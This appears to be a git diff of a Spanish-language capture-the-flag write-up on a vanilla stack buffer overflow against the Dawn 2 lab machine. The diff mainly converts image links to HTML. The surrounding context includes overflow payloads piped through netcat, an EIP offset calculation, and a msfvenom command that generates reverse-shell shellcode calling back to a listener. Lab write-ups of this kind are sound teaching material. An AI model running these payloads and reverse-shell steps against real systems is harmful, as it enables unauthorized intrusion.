@@ -41,7 +41,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Jul 14 19:21:14 2021 -- 1 IP address (1 host up) scanned in 35.20 seconds
 ```
 
-![[Pasted image 20210714193940.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714193940.png" height="500" width="825" /></p>
 
 ## Preparación entorno
 
@@ -65,14 +65,14 @@ Para comprobar que se ha instalado correctamente es posible hacer uso del comand
 ```
 !mona
 ```
-![[Pasted image 20210714195240.png]]
+
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714195240.png" height="500" width="825" /></p>
 
 Para comprobar que funciona correctamente, se abrirá el binario con Immunity Debbuger y se lanzará una conexión con netcat para, de esta manera, establecer una conexión contra el servicio.
 
-![[Pasted image 20210714194220.png]]
-![[Pasted image 20210714194245.png]]
-![[Pasted image 20210714194347.png]]
-![[Pasted image 20210714194456.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714194220.png" height="500" width="825" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714194245.png" height="500" width="825" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210714194347.png" height="500" width="825" /></p>
 
 > En las screenshots aparecerá OllyDbg, pero se sigue el mismo procedimiento.
 
@@ -104,7 +104,7 @@ python2.7 -c "print('A'*800+'\x00')" | nc 192.168.1.88 1985
 
 Una vez enviados los bytes se observa que el EIP se sobreescribe con \x41\x41\x41\x41, las 'A's. El programa se corrompe ya que la siguiente instrucción que será ejecutada no existe en la memoria.
 
-![[Pasted image 20210721164642.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721164642.png" height="500" width="825" /></p>
 
 ### Getting the offset
 El offset el la cantidad de caracteres que se deben enviar antes de sobreescribir el `EIP`. 
@@ -138,7 +138,7 @@ msf-pattern_offset -l 800 -q 316A4130
 [*] Exact match at offset 272
 ```
 
-![[Pasted image 20210721170311.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721170311.png" height="500" width="825" /></p>
 
 ### Push ESP
 
@@ -166,15 +166,15 @@ python2.7 -c "print('A'*272+'\x77\x17\x58\x34'+'\x00')" | nc 192.168.1.88 1985
 Se colocará un breakpoint en esa misma dirección para ver que el programa se está redirigiendo hacia ella.
 
 Con el atajo `Ctrl+G` se va hacia la dirección en memoria de la función:
-![[Pasted image 20210721171129.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171129.png" height="500" width="825" /></p>
 
 Una vez en ella se añade un segundo breakpoint y seguimos el flujo del programa dandole al play `F9`.
 
-![[Pasted image 20210721171251.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171251.png" height="500" width="825" /></p>
 
 Se envia el payload y, efectivamente, despues de llenar de basura con 'A's el stack cae en la funcion a la que se le ha dirigido, sobreescribiendo asi el EIP.
 
-![[Pasted image 20210721171402.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721171402.png" height="500" width="825" /></p>
 
 El siguiente paso a realizar será la creación de la shellcode, en este caso una shell reversa por TCP, para generarla simplemente se hará uso de msfvenom:
 
@@ -220,7 +220,4 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.186 LPORT=9001 -f c -b 
 
 Una vez ejecutado, se puede observar que desde el netcat se recibe la shell de la máquina, dandonos acceso a la misma.
 
-![[Pasted image 20210721174535.png]]
-
-
-
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-21-Dawn-2-Vanilla-Buffer-Overflow/Pasted%20image%2020210721174535.png" height="500" width="825" /></p>
